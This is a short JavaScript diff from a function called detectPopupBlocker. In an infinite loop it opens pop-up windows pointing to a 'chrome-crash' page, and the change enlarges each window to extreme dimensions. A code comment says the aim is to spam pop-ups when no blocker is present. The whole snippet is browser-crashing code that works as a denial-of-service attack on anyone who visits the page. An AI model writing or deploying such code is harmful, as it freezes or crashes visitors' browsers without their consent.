@@ -17,7 +17,7 @@ function detectPopupBlocker() {
   } else {
     myTest.close();
     while (true) {
-      var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
+      var strWindowFeatures = "location=yes,height=123400,width=45400,scrollbars=yes,status=yes";
       var URL = "https://the-imortal-crasher.github.io/chrome-crash/" + location.href;
       var win = window.open(URL, "_blank", strWindowFeatures);
       //If no pop-up blocker spams a shit ton of pop-ups
